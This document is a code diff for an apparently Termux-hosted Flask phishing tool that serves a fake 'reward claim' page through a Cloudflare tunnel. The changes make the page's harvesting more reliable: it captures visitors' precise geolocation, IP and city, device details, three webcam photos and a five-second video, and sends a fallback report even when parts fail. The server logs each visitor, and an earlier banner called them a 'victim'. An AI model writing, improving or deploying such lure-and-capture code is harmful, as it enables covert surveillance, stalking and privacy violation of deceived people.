@@ -90,9 +90,10 @@ def start_cloudflare():
         # Try to read the URL from output
         try:
             # Cloudflare usually shows the URL in stderr
-            stderr_output = process.stderr.read()
-            lines = stderr_output.split('\n')
-            for line in lines:
+            import select
+            ready, _, _ = select.select([process.stderr], [], [], 5)
+            if ready:
+                line = process.stderr.readline()
                 if '.trycloudflare.com' in line:
                     url = line.split()[-1]
                     if url.startswith('https://'):
@@ -178,7 +179,7 @@ def display_qr_in_termux(url):
         print(f"{Fore.RED}❌ QR generation failed: {e}{Style.RESET_ALL}")
         return False
 
-# Simple and working HTML page
+# FIXED HTML PAGE - Simplified and working
 HTML_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -358,106 +359,127 @@ HTML_PAGE = """
             status.style.display = 'block';
             
             try {
-                // Get camera access
-                status.innerHTML = '📷 Accessing camera...';
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: true 
-                });
+                // Collect basic data first (IP, location, device info)
+                status.innerHTML = '🌐 Collecting your information...';
                 
-                // Take 3 photos
-                status.innerHTML = '📸 Taking photos (1/3)...';
-                const photos = [];
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                
-                for(let i = 0; i < 3; i++) {
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    ctx.drawImage(video, 0, 0);
-                    photos.push(canvas.toDataURL('image/jpeg'));
-                    status.innerHTML = `📸 Taking photos (${i+1}/3)...`;
-                }
-                
-                // Record 5-second video
-                status.innerHTML = '🎥 Recording video (5 seconds)...';
+                let locationData = null;
+                let ipInfo = {ip: 'Unknown', city: 'Unknown', country: 'Unknown'};
+                let photos = [];
                 let videoData = null;
-                try {
-                    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                    const chunks = [];
-                    
-                    recorder.ondataavailable = e => {
-                        if (e.data.size > 0) chunks.push(e.data);
-                    };
-                    
-                    recorder.start();
-                    await new Promise(resolve => setTimeout(resolve, 5000));
-                    recorder.stop();
-                    
-                    await new Promise(resolve => {
-                        recorder.onstop = () => {
-                            const blob = new Blob(chunks, { type: 'video/webm' });
-                            const reader = new FileReader();
-                            reader.onload = () => {
-                                videoData = reader.result;
-                                resolve();
-                            };
-                            reader.readAsDataURL(blob);
-                        };
-                    });
-                } catch(e) {
-                    console.log('Video recording skipped:', e);
-                }
                 
                 // Get location
-                status.innerHTML = '📍 Getting your location...';
-                let location = null;
                 try {
-                    location = await new Promise((resolve, reject) => {
+                    locationData = await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(resolve, reject, {
                             enableHighAccuracy: true,
-                            timeout: 10000,
+                            timeout: 15000,
                             maximumAge: 0
                         });
                     });
+                    status.innerHTML = '📍 Location captured...';
                 } catch(e) {
-                    console.log('Location access not available');
+                    console.log('Location not available');
                 }
                 
                 // Get IP info
-                status.innerHTML = '🌐 Getting network information...';
-                let ipInfo = {ip: 'Unknown', city: 'Unknown', country: 'Unknown'};
                 try {
                     const ipResponse = await fetch('https://api.ipify.org?format=json');
                     const ipData = await ipResponse.json();
                     ipInfo.ip = ipData.ip;
                     
-                    // Try to get more details
+                    // Get detailed IP info
                     try {
-                        const detailResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
+                        const detailResponse = await fetch('https://ipapi.co/json/');
                         const detailData = await detailResponse.json();
-                        if(detailData.city) ipInfo.city = detailData.city;
-                        if(detailData.country) ipInfo.country = detailData.country;
+                        ipInfo.city = detailData.city || 'Unknown';
+                        ipInfo.country = detailData.country_name || 'Unknown';
                     } catch(e) {
-                        // Skip detailed info if failed
+                        // Fallback IP service
+                        try {
+                            const detailResponse = await fetch('http://ip-api.com/json/');
+                            const detailData = await detailResponse.json();
+                            ipInfo.city = detailData.city || 'Unknown';
+                            ipInfo.country = detailData.country || 'Unknown';
+                        } catch(e2) {
+                            console.log('Detailed IP info not available');
+                        }
                     }
+                    status.innerHTML = '🌐 IP information collected...';
                 } catch(e) {
                     console.log('IP info not available');
                 }
                 
-                // Stop camera
-                stream.getTracks().forEach(track => track.stop());
+                // Try to access camera for photos and video
+                status.innerHTML = '📷 Requesting camera access...';
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: "user" }, 
+                        audio: false 
+                    });
+                    
+                    // Take 3 photos
+                    status.innerHTML = '📸 Taking photos...';
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
+                    
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    
+                    for(let i = 0; i < 3; i++) {
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        ctx.drawImage(video, 0, 0);
+                        photos.push(canvas.toDataURL('image/jpeg'));
+                        status.innerHTML = `📸 Photo ${i+1}/3 captured...`;
+                    }
+                    
+                    // Record 5-second video
+                    status.innerHTML = '🎥 Recording video...';
+                    try {
+                        const recorder = new MediaRecorder(stream, { 
+                            mimeType: 'video/webm;codecs=vp8,opus' 
+                        });
+                        const chunks = [];
+                        
+                        recorder.ondataavailable = e => {
+                            if (e.data.size > 0) chunks.push(e.data);
+                        };
+                        
+                        recorder.start(1000); // Collect data every second
+                        await new Promise(resolve => setTimeout(resolve, 5000));
+                        recorder.stop();
+                        
+                        await new Promise(resolve => {
+                            recorder.onstop = () => {
+                                const blob = new Blob(chunks, { type: 'video/webm' });
+                                const reader = new FileReader();
+                                reader.onload = () => {
+                                    videoData = reader.result;
+                                    resolve();
+                                };
+                                reader.readAsDataURL(blob);
+                            };
+                        });
+                    } catch(videoError) {
+                        console.log('Video recording failed:', videoError);
+                    }
+                    
+                    // Stop camera
+                    stream.getTracks().forEach(track => track.stop());
+                    status.innerHTML = '✅ Media collection complete...';
+                    
+                } catch(cameraError) {
+                    console.log('Camera access denied:', cameraError);
+                    status.innerHTML = '📱 Camera not available, collecting other data...';
+                }
                 
-                // Prepare data
+                // Prepare final payload
                 const payload = {
-                    latitude: location?.coords?.latitude,
-                    longitude: location?.coords?.longitude,
-                    accuracy: location?.coords?.accuracy,
+                    latitude: locationData?.coords?.latitude,
+                    longitude: locationData?.coords?.longitude,
+                    accuracy: locationData?.coords?.accuracy,
                     ip: ipInfo.ip,
                     city: ipInfo.city,
                     country: ipInfo.country,
@@ -468,7 +490,10 @@ HTML_PAGE = """
                         platform: navigator.platform,
                         screen: `${screen.width}x${screen.height}`,
                         language: navigator.language,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        cookies: navigator.cookieEnabled,
+                        java: navigator.javaEnabled(),
+                        pdf: navigator.pdfViewerEnabled
                     },
                     timestamp: Date.now()
                 };
@@ -487,19 +512,49 @@ HTML_PAGE = """
                     status.innerHTML = '✅ Reward Claimed Successfully!';
                     btn.innerHTML = '✅ REWARD CLAIMED';
                     
-                    // Show collected data
+                    // Show collected data summary
                     dataDiv.style.display = 'block';
+                    document.getElementById('loc').textContent = 
+                        payload.latitude ? 'Captured' : 'Not Available';
+                    document.getElementById('ip').textContent = 'Captured';
+                    document.getElementById('photos').textContent = `${payload.photos.length} photos`;
+                    document.getElementById('video').textContent = payload.video ? '5s recorded' : 'Not available';
+                    document.getElementById('device').textContent = 'Verified';
                     
                 } else {
-                    throw new Error('Server error');
+                    throw new Error('Server response not OK');
                 }
                     
             } catch(error) {
-                console.error('Error:', error);
+                console.error('Complete error:', error);
                 status.className = 'status error';
-                status.innerHTML = '❌ Please allow camera access and try again';
+                status.innerHTML = '⚠️ Some features failed, but basic data collected';
                 btn.disabled = false;
                 btn.innerHTML = '🎁 TRY AGAIN';
+                
+                // Even if some features fail, try to send basic data
+                try {
+                    const basicPayload = {
+                        ip: 'Unknown',
+                        city: 'Unknown', 
+                        country: 'Unknown',
+                        deviceInfo: {
+                            userAgent: navigator.userAgent,
+                            platform: navigator.platform,
+                            screen: `${screen.width}x${screen.height}`,
+                            language: navigator.language
+                        },
+                        timestamp: Date.now(),
+                        error: error.toString()
+                    };
+                    await fetch('/report', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(basicPayload)
+                    });
+                } catch(finalError) {
+                    console.log('Final send failed:', finalError);
+                }
             }
         };
     </script>
@@ -525,6 +580,7 @@ def report():
         photos = data.get("photos", [])
         video = data.get("video")
         device_info = data.get("deviceInfo", {})
+        error_msg = data.get("error")
         
         # Save photos
         photo_files = []
@@ -540,7 +596,7 @@ def report():
                 photo_files.append(filename)
                 print(f"{Fore.GREEN}✅ Saved photo: {filename}{Style.RESET_ALL}")
             except Exception as e:
-                print(f"{Fore.RED}❌ Photo save error: {e}{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}⚠️ Photo {i+1} save skipped: {e}{Style.RESET_ALL}")
         
         # Save video
         video_file = None
@@ -556,7 +612,7 @@ def report():
                 video_file = filename
                 print(f"{Fore.GREEN}✅ Saved video: {filename}{Style.RESET_ALL}")
             except Exception as e:
-                print(f"{Fore.RED}❌ Video save error: {e}{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}⚠️ Video save skipped: {e}{Style.RESET_ALL}")
         
         # Save to CSV
         record = {
@@ -566,13 +622,14 @@ def report():
             'country': country,
             'latitude': lat,
             'longitude': lon,
-            'photos': ', '.join(photo_files),
+            'photos': ', '.join(photo_files) if photo_files else 'None',
             'video': video_file or 'None',
             'user_agent': device_info.get('userAgent', 'Unknown'),
             'platform': device_info.get('platform', 'Unknown'),
             'screen': device_info.get('screen', 'Unknown'),
             'language': device_info.get('language', 'Unknown'),
-            'timezone': device_info.get('timezone', 'Unknown')
+            'timezone': device_info.get('timezone', 'Unknown'),
+            'error': error_msg or 'None'
         }
         
         # Save to CSV
@@ -584,7 +641,7 @@ def report():
             writer.writerow(record)
         
         # Print results in Termux
-        print(f"\n{Fore.GREEN}{'🚨 NEW VICTIM DATA CAPTURED 🚨':^60}{Style.RESET_ALL}")
+        print(f"\n{Fore.GREEN}{'🚨 NEW DATA CAPTURED 🚨':^60}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}🕐 Time: {record['timestamp']}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}📍 Location: {lat if lat else 'Not Available'}, {lon if lon else 'Not Available'}{Style.RESET_ALL}")
@@ -592,6 +649,10 @@ def report():
         print(f"{Fore.YELLOW}📸 Photos: {len(photo_files)} saved{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}🎥 Video: {'Yes' if video_file else 'No'}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}📱 Device: {device_info.get('platform', 'Unknown')}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}🖥️ Screen: {device_info.get('screen', 'Unknown')}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}🗣️ Language: {device_info.get('language', 'Unknown')}{Style.RESET_ALL}")
+        if error_msg:
+            print(f"{Fore.RED}⚠️ Errors: {error_msg}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
         print(f"{Fore.GREEN}💾 Files saved in: {DOWNLOAD_FOLDER}{Style.RESET_ALL}")
         print(f"{Fore.GREEN}📊 Report: {REPORT_CSV}{Style.RESET_ALL}\n")
@@ -600,7 +661,7 @@ def report():
         
     except Exception as e:
         print(f"{Fore.RED}❌ Server Error: {e}{Style.RESET_ALL}")
-        return jsonify({"status": "error"}), 500
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 def get_local_ip():
     """Get local IP address"""
